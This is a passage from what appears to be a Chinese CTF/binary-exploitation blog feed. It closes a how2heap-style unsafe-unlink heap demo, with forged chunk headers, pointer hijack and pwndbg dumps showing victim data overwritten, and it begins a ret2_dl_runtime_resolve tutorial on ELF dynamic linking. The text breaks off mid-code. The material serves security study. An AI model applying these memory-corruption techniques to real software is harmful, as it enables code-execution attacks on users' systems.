class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-comment">// Next modify the header of chunk2 to pass all security checks</span><br> chunk2_hdr = (struct chunk_structure *)(chunk2 - <span class="hljs-number">2</span>);<br> <span class="hljs-function"><span class="hljs-title">chunk2_hdr</span>-&gt;</span>prev_size = <span class="hljs-number">0</span>x80;  <span class="hljs-comment">// chunk1&#x27;s data region size</span><br> <span class="hljs-function"><span class="hljs-title">chunk2_hdr</span>-&gt;</span>size &amp;= ~<span class="hljs-number">1</span>;        <span class="hljs-comment">// Unsetting prev_in_use bit</span><br><br> <span class="hljs-comment">// Now, when chunk2 is freed, attacker&#x27;s fake chunk is &#x27;unlinked&#x27;</span><br> <span class="hljs-comment">// This results in chunk1 pointer pointing to chunk1 - 3</span><br> <span class="hljs-comment">// i.e. chunk1[3] now contains chunk1 itself.</span><br> <span class="hljs-comment">// We then make chunk1 point to some victim&#x27;s data</span><br> free(chunk2);<br></code></pre></td></tr></table></figure><p>  鉴于我们要用unlink操作,因此我们要把pre_size设为之前的chunk的size,然后把chunk2 free掉,下面就是进行Unlink操作了,free掉之后的栈里是这样的:<br>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0</span>x7fffffffe5f0 —▸ <span class="hljs-number">0</span>x7fffffffe5d8 —▸ <span class="hljs-number">0</span>x400570 (_start) ◂— xor    ebp, ebp<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0</span>x7fffffffe5f8 —▸ <span class="hljs-number">0</span>x6020a0 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0</span>x7fffffffe600 —▸ <span class="hljs-number">0</span>x602010 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0</span>x7fffffffe608 —▸ <span class="hljs-number">0</span>x602090 ◂— <span class="hljs-number">0</span>x80<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0020</span>│      <span class="hljs-number">0</span>x7fffffffe610 —▸ <span class="hljs-number">0</span>x400800 (__libc_csu_init) ◂— push   r15<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0</span>x7fffffffe618 —▸ <span class="hljs-number">0</span>x400570 (_start) ◂— xor    ebp, ebp<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0</span>x7fffffffe620 —▸ <span class="hljs-number">0</span>x7fffffffe710 ◂— <span class="hljs-number">0</span>x1<br><span class="hljs-attribute">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0</span>x7fffffffe628 ◂— <span class="hljs-number">0</span>x8d2094d70fe4fc00<br></code></pre></td></tr></table></figure><br>可以看到我们已经成功的把chunk1的地址劫持到了0x7ffffffe5d8的位置,内存空间如下:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">11</span>gx <span class="hljs-number">0</span>x7fffffffe5d8-<span class="hljs-number">16</span><br><span class="hljs-attribute">0x7fffffffe5c8</span>: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x00007fffffffe630<br><span class="hljs-attribute">0x7fffffffe5d8</span>: <span class="hljs-number">0</span>x0000000000400570      <span class="hljs-number">0</span>x00007fffffffe710<br><span class="hljs-attribute">0x7fffffffe5e8</span>: <span class="hljs-number">0</span>x0000000000400753      <span class="hljs-number">0</span>x00007fffffffe5d8<br><span class="hljs-attribute">0x7fffffffe5f8</span>: <span class="hljs-number">0</span>x00000000006020a0      <span class="hljs-number">0</span>x0000000000602010<br><span class="hljs-attribute">0x7fffffffe608</span>: <span class="hljs-number">0</span>x0000000000602090      <span class="hljs-number">0</span>x0000000000400800<br><span class="hljs-attribute">0x7fffffffe618</span>: <span class="hljs-number">0</span>x0000000000400570<br></code></pre></td></tr></table></figure><p>这时候我们再看chunk[3],也就是chunk+3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">11</span>gx <span class="hljs-number">0</span>x7fffffffe5d8+<span class="hljs-number">24</span><br><span class="hljs-attribute">0x7fffffffe5f0</span>: <span class="hljs-number">0</span>x00007fffffffe5d8      <span class="hljs-number">0</span>x00000000006020a0<br><span class="hljs-attribute">0x7fffffffe600</span>: <span class="hljs-number">0</span>x0000000000602010      <span class="hljs-number">0</span>x0000000000602090<br><span class="hljs-attribute">0x7fffffffe610</span>: <span class="hljs-number">0</span>x0000000000400800      <span class="hljs-number">0</span>x0000000000400570<br><span class="hljs-attribute">0x7fffffffe620</span>: <span class="hljs-number">0</span>x00007fffffffe710      <span class="hljs-number">0</span>x8d2094d70fe4fc00<br><span class="hljs-attribute">0x7fffffffe630</span>: <span class="hljs-number">0</span>x0000000000400800      <span class="hljs-number">0</span>x00007ffff7a2d830<br><span class="hljs-attribute">0x7fffffffe640</span>: <span class="hljs-number">0</span>x0000000000000000<br></code></pre></td></tr></table></figure><p>chunk[3]的地址也已经变成了chunk[1]的地址,然后就是最后的几个操作了</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">chunk1</span>[<span class="hljs-number">3</span>] = (unsigned long long)<span class="hljs-class"><span class="hljs-keyword">data</span>;</span><br> <br>  strcpy(<span class="hljs-class"><span class="hljs-keyword">data</span>, &quot;<span class="hljs-type">Victim&#x27;s</span> <span class="hljs-keyword">data</span>&quot;);</span><br> <br>  printf(<span class="hljs-string">&quot;%s\n&quot;</span>,<span class="hljs-class"><span class="hljs-keyword">data</span>);</span><br>  // <span class="hljs-type">Overwrite</span> victim&#x27;s <span class="hljs-class"><span class="hljs-keyword">data</span> using chunk1</span><br>  chunk1[<span class="hljs-number">0</span>] = 0x002164656b636168LL;<br> <br>  printf(<span class="hljs-string">&quot;%s\n&quot;</span>, <span class="hljs-class"><span class="hljs-keyword">data</span>);</span><br></code></pre></td></tr></table></figure><p>先是给chunk[3]赋值为”Victim’s data”,此时的栈:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">│ <span class="hljs-built_in">rdx</span> <span class="hljs-built_in">rsp</span>  <span class="hljs-number">0x7fffffffe5f0</span> —▸ <span class="hljs-number">0x7fffffffe610</span> ◂— <span class="hljs-string">&quot;Victim&#x27;s data&quot;</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│          <span class="hljs-number">0x7fffffffe5f8</span> —▸ <span class="hljs-number">0x6020a0</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│          <span class="hljs-number">0x7fffffffe600</span> —▸ <span class="hljs-number">0x602010</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│          <span class="hljs-number">0x7fffffffe608</span> —▸ <span class="hljs-number">0x602090</span> ◂— <span class="hljs-number">0x80</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│ <span class="hljs-built_in">rax</span>      <span class="hljs-number">0x7fffffffe610</span> ◂— <span class="hljs-string">&quot;Victim&#x27;s data&quot;</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│          <span class="hljs-number">0x7fffffffe618</span> ◂— <span class="hljs-number">0x6174616420</span> /* <span class="hljs-string">&#x27; data&#x27;</span> */<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│          <span class="hljs-number">0x7fffffffe620</span> —▸ <span class="hljs-number">0x7fffffffe710</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│          <span class="hljs-number">0x7fffffffe628</span> ◂— <span class="hljs-number">0x8d2094d70fe4fc00</span><br></code></pre></td></tr></table></figure><p>chunk1的内容:</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> x<span class="hljs-symbol">/s</span> chunk1<br><span class="hljs-number">0</span><span class="hljs-params">x7fffffffe610:</span> <span class="hljs-string">&quot;Victim&#x27;s data&quot;</span><br></code></pre></td></tr></table></figure><p>我们的chunk1已经改成了<code>Victim&#39;s data</code><br>然后进行chunk1[0]的赋值,此时的栈:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0</span>x7fffffffe5f0 —▸ <span class="hljs-number">0</span>x7fffffffe610 ◂— <span class="hljs-number">0</span>x2164656b636168 /* &#x27;hacked!&#x27; */<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0</span>x7fffffffe5f8 —▸ <span class="hljs-number">0</span>x6020a0 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0</span>x7fffffffe600 —▸ <span class="hljs-number">0</span>x602010 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0</span>x7fffffffe608 —▸ <span class="hljs-number">0</span>x602090 ◂— <span class="hljs-number">0</span>x80<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0020</span>│ rax  <span class="hljs-number">0</span>x7fffffffe610 ◂— <span class="hljs-number">0</span>x2164656b636168 /* &#x27;hacked!&#x27; */<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0</span>x7fffffffe618 ◂— <span class="hljs-number">0</span>x6174616420 /* &#x27; data&#x27; */<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0</span>x7fffffffe620 —▸ <span class="hljs-number">0</span>x7fffffffe710 ◂— <span class="hljs-number">0</span>x1<br><span class="hljs-attribute">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0</span>x7fffffffe628 ◂— <span class="hljs-number">0</span>x8d2094d70fe4fc00<br></code></pre></td></tr></table></figure><p>此时的data:</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">pwndbg</span>&gt; x/s <span class="hljs-class"><span class="hljs-keyword">data</span></span><br><span class="hljs-number">0x7fffffffe610</span>: <span class="hljs-string">&quot;hacked!&quot;</span><br></code></pre></td></tr></table></figure><p>Over~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2_dl_runtime_resolve</title>
    <link href="/2019/07/17/ret2-dl-runtime-resolve/"/>
    <url>/2019/07/17/ret2-dl-runtime-resolve/</url>
    
    <content type="html"><![CDATA[<blockquote><p>遇到无法leak的题目的时候..日常roputils一把梭..这次就打算从原理学习一下”Return_to_dl_resolve“这项技术。可能写的会有些杂乱 </p></blockquote><h1 id="借鉴和参考学习的师傅们的文章"><a href="#借鉴和参考学习的师傅们的文章" class="headerlink" title="借鉴和参考学习的师傅们的文章"></a>借鉴和参考学习的师傅们的文章</h1><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//veritas<span class="hljs-number">501</span>.space/<span class="hljs-number">2017</span>/<span class="hljs-number">10</span>/<span class="hljs-number">07</span>/<span class="hljs-keyword">ret</span><span class="hljs-number">2</span>dl_resolve<span class="hljs-variable">%E5</span><span class="hljs-variable">%AD</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%E4</span><span class="hljs-variable">%B9</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%B0</span>/<br><span class="hljs-symbol">http:</span>//pwn<span class="hljs-number">4</span>.fun/<span class="hljs-number">2016</span>/<span class="hljs-number">11</span>/<span class="hljs-number">09</span>/Return-<span class="hljs-keyword">to</span>-dl-resolve/<br><span class="hljs-symbol">https:</span>//www.hirworld.xyz/posts/<span class="hljs-number">3</span>bfd<span class="hljs-number">0449</span>/<br><span class="hljs-symbol">https:</span>//www.anquanke.com/post/id/<span class="hljs-number">177450</span>#h<span class="hljs-number">3</span><span class="hljs-number">-7</span><br><span class="hljs-symbol">http:</span>//www.reversing.win/<span class="hljs-number">2017</span>/<span class="hljs-number">08</span>/<span class="hljs-number">29</span>/<span class="hljs-variable">%E4</span><span class="hljs-variable">%BA</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%E6</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%88</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%BA</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%87</span><span class="hljs-variable">%BA</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E6</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%E5</span><span class="hljs-variable">%88</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%94</span><span class="hljs-variable">%A8-ret2resolve</span>/<br><span class="hljs-symbol">https:</span>//xz.aliyun.com/t/<span class="hljs-number">5111</span>#toc<span class="hljs-number">-2</span><br></code></pre></td></tr></table></figure><p>看了这么多才看懂。。实在是tcl…</p><h1 id="原理部分"><a href="#原理部分" class="headerlink" title="原理部分"></a>原理部分</h1><p>ret2_dl技术利用了函数的延迟绑定机制</p><h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>ELF将GOT表拆成了两个表，一个是“.got”（保存变量）,”.got.plt”（保存函数）<br>而.got.plt表的前三项为：</p><ol><li>.dynamic 段的地址</li></ol><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs elm">.dynamic段：<br><span class="hljs-type">Elf32_Dyn</span>由一个类型值加上一个附加的数值或指针。<br>/*typedef struct &#123;<br>    <span class="hljs-type">Elf32_Sword</span> d_tag;<br>    union &#123;<br>        <span class="hljs-type">Elf32_Word</span> d_val;<br>        <span class="hljs-type">Elf32_Addr</span> d_ptr;<br>    &#125;<br>&#125; <span class="hljs-type">Elf32_Dyn</span>*/<br><span class="hljs-type">DT_SYMTAB</span>，动态链接符号表的地址，d_ptr表示.dynsym的地址<br><span class="hljs-type">DT_STRTAB</span>，动态链接字符串表地址，d_ptr表示.dynstr的地址<br><span class="hljs-type">DT_HASH</span>，动态链接哈希表大小，d_val表示大小<br><span class="hljs-type">DT_SONAME</span>，本共享对象的<span class="hljs-type">SO</span>-<span class="hljs-type">NAME</span><br><span class="hljs-type">DT_RPATH</span>，动态链接共享对象搜索路径<br><span class="hljs-type">DT_INIT</span>，初始化代码地址<br><span class="hljs-type">DT_FINIT</span>，结束代码地址<br><span class="hljs-type">DT_NEED</span>，依赖的共享对象文件，d_ptr表示依赖的共享对象文件名<br><span class="hljs-type">DT_REL</span>，动态链接重定位表地址<br><span class="hljs-type">DT_RELA</span>，<br><span class="hljs-type">DT_RELENT</span>，动态重读位表入口数量<br><span class="hljs-type">DT_RELANET</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>本模块的 ID</p></li><li><p>_dl_runtime_resolve()的地址</p></li></ol><p>我们可以查看任意程序的节区：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs tap">Section Headers:<br>  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al<br>  [ 0]                   NULL           <span class="hljs-number"> 00000000 </span>000000<span class="hljs-number"> 000000 </span>00     <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 0<br>  [ 1] .interp           PROGBITS       <span class="hljs-number"> 08048154 </span>000154<span class="hljs-number"> 000013 </span>00   A <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 1<br>  [ 2] .note.ABI-tag     NOTE           <span class="hljs-number"> 08048168 </span>000168<span class="hljs-number"> 000020 </span>00   A <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [ 3] .note.gnu.build-i NOTE           <span class="hljs-number"> 08048188 </span>000188<span class="hljs-number"> 000024 </span>00   A <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c<span class="hljs-number"> 04 </span>  A <span class="hljs-number"> 5 </span> <span class="hljs-number"> 0 </span> 4<br>  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0<span class="hljs-number"> 10 </span>  A <span class="hljs-number"> 6 </span> <span class="hljs-number"> 1 </span> 4<br>  [ 6] .dynstr           STRTAB         <span class="hljs-number"> 08048278 </span>000278 00006b<span class="hljs-number"> 00 </span>  A <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 1<br>  [ 7] .gnu.version      VERSYM          080482e4 0002e4<span class="hljs-number"> 000014 </span>02   A <span class="hljs-number"> 5 </span> <span class="hljs-number"> 0 </span> 2<br>  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8<span class="hljs-number"> 000020 </span>00   A <span class="hljs-number"> 6 </span> <span class="hljs-number"> 1 </span> 4<br>  [ 9] .rel.dyn          REL            <span class="hljs-number"> 08048318 </span>000318<span class="hljs-number"> 000018 </span>08   A <span class="hljs-number"> 5 </span> <span class="hljs-number"> 0 </span> 4<br>  [10] .rel.plt          REL            <span class="hljs-number"> 08048330 </span>000330<span class="hljs-number"> 000028 </span>08  AI <span class="hljs-number"> 5 </span><span class="hljs-number"> 24 </span> 4<br>  [11] .init             PROGBITS       <span class="hljs-number"> 08048358 </span>000358<span class="hljs-number"> 000023 </span>00  AX <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [12] .plt              PROGBITS       <span class="hljs-number"> 08048380 </span>000380<span class="hljs-number"> 000060 </span>04  AX <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span>16<br>  [13] .plt.got          PROGBITS        080483e0 0003e0<span class="hljs-number"> 000008 </span>00  AX <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 8<br>  [14] .text             PROGBITS        080483f0 0003f0<span class="hljs-number"> 000232 </span>00  AX <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span>16<br>  [15] .fini             PROGBITS       <span class="hljs-number"> 08048624 </span>000624<span class="hljs-number"> 000014 </span>00  AX <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [16] .rodata           PROGBITS       <span class="hljs-number"> 08048638 </span>000638<span class="hljs-number"> 000008 </span>00   A <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [17] .eh_frame_hdr     PROGBITS       <span class="hljs-number"> 08048640 </span>000640<span class="hljs-number"> 000034 </span>00   A <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [18] .eh_frame         PROGBITS       <span class="hljs-number"> 08048674 </span>000674 0000f4<span class="hljs-number"> 00 </span>  A <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [19] .init_array       INIT_ARRAY      08049f08 000f08<span class="hljs-number"> 000004 </span>00  WA <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c<span class="hljs-number"> 000004 </span>00  WA <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [21] .jcr              PROGBITS        08049f10 000f10<span class="hljs-number"> 000004 </span>00  WA <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8<span class="hljs-number"> 08 </span> WA <span class="hljs-number"> 6 </span> <span class="hljs-number"> 0 </span> 4<br>  [23] .got              PROGBITS        08049ffc 000ffc<span class="hljs-number"> 000004 </span>04  WA <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [24] .got.plt          PROGBITS        0804a000<span class="hljs-number"> 001000 </span>000020<span class="hljs-number"> 04 </span> WA <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [25] .data             PROGBITS        0804a020<span class="hljs-number"> 001020 </span>000008<span class="hljs-number"> 00 </span> WA <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 4<br>  [26] .bss              NOBITS          0804a040<span class="hljs-number"> 001028 </span>00000c<span class="hljs-number"> 00 </span> WA <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span>32<br>  [27] .comment          PROGBITS       <span class="hljs-number"> 00000000 </span>001028<span class="hljs-number"> 000035 </span>01  MS <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 1<br>  [28] .shstrtab         STRTAB         <span class="hljs-number"> 00000000 </span>001798 00010a<span class="hljs-number"> 00 </span>    <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 1<br>  [29] .symtab           SYMTAB         <span class="hljs-number"> 00000000 </span>001060 0004b0<span class="hljs-number"> 10 </span>   <span class="hljs-number"> 30 </span><span class="hljs-number"> 47 </span> 4<br>  [30] .strtab           STRTAB         <span class="hljs-number"> 00000000 </span>001510<span class="hljs-number"> 000288 </span>00     <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span> 1<br></code></pre></td></tr></table></figure><ul><li>其中.rel.plt是用于函数重定位的<br>其结构体定义如下：</li></ul><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">typedef struct &#123;<br>    Elf32_Addr r_offset;    <span class="hljs-comment">// 对于可执行文件，此值为虚拟地址</span><br>    Elf32_Word r_info;      <span class="hljs-comment">// 符号表索引</span><br>&#125; Elf32_Rel;<br><br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">ELF32_R_SYM</span>(info) ((info)&gt;&gt;<span class="hljs-number">8</span>)<br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">ELF32_R_TYPE</span>(info) ((unsigned char)(info))<br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">ELF32_R_INFO</span>(sym, type) (((sym)&lt;&lt;<span class="hljs-number">8</span>)+(unsigned char)(type))<br></code></pre></td></tr></table></figure><p>而在最前面我们也提及过got.plt中保存了函数偏移，而这个正好对应的是Rel结构体中的r_offset，而LF32_R_TYPE&#x3D;7,这也是R_386_JUMP_SLOT的值</p><ul><li>.dynsym节包含了动态链接符号表<br>其结构体定义如下：</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span><br>&#123;<br>    Elf32_Word st_name;     <span class="hljs-comment">// Symbol name(string tbl index)</span><br>    Elf32_Addr st_value;    <span class="hljs-comment">// Symbol value</span><br>    Elf32_Word st_size;     <span class="hljs-comment">// Symbol size</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info;  <span class="hljs-comment">// Symbol type and binding</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other; <span class="hljs-comment">// Symbol visibility under glibc&gt;=2.2</span><br>    Elf32_Section st_shndx; <span class="hljs-comment">// Section index</span><br>&#125; Elf32_Sym;<br></code></pre></td></tr></table></figure><ul><li><p>.dynstr节则包含了字符串,其以\x00为开头结尾<br>Elf32_Sym[num]-&gt;st_name&#x3D;.dynsym + Elf32_Sym_size * num<br>而字符串的地址就在:Elf32_Sym[num]-&gt;st_name+.dynstr的地方</p></li><li><p>.plt节为过程链接表<br>用来确定函数的绝对地址</p></li></ul><p>而动态链接的过程即为:</p><ol><li>第一次调用函数时,将rel_arg压入栈中然后跳转到函数的PLT[0]位置</li><li>PLT[0]将link_map压入栈中</li><li>调用_dl_runtime_resolve(link_map, reloc_arg)函数,将函数的绝对地址写入GOT表中,从而完成调用</li></ol><p>这其中还调用了_dl_fixup函数,这里引用师傅的函数解释</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs rust">_dl_fixup(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *l, <span class="hljs-title function_ invoke__">ElfW</span>(Word) reloc_arg)<br>&#123;<br>    <span class="hljs-comment">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span><br>    <span class="hljs-keyword">const</span> PLTREL *<span class="hljs-keyword">const</span> reloc = (<span class="hljs-keyword">const</span> void *) (<span class="hljs-title function_ invoke__">D_PTR</span> (l, l_info[DT_JMPREL]) + reloc_offset);<br>    <span class="hljs-comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_ invoke__">ElfW</span>(Sym) *sym = &amp;symtab[<span class="hljs-title function_ invoke__">ELFW</span>(R_SYM) (reloc<span class="hljs-punctuation">-&gt;</span>r_info)];<br>    <span class="hljs-comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span><br>    <span class="hljs-title function_ invoke__">assert</span> (<span class="hljs-title function_ invoke__">ELFW</span>(R_TYPE)(reloc<span class="hljs-punctuation">-&gt;</span>r_info) == ELF_MACHINE_JMP_SLOT);<br>    <span class="hljs-comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br>    result = _dl_lookup_symbol_x (strtab + sym<span class="hljs-punctuation">-&gt;</span>st_name, l, &amp;sym, l<span class="hljs-punctuation">-&gt;</span>l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);<br>    <span class="hljs-comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span><br>    value = <span class="hljs-title function_ invoke__">DL_FIXUP_MAKE_VALUE</span> (result, sym ? (<span class="hljs-title function_ invoke__">LOOKUP_VALUE_ADDRESS</span> (result) + sym<span class="hljs-punctuation">-&gt;</span>st_value) : <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 最后把value写入相应的GOT表条目中</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ 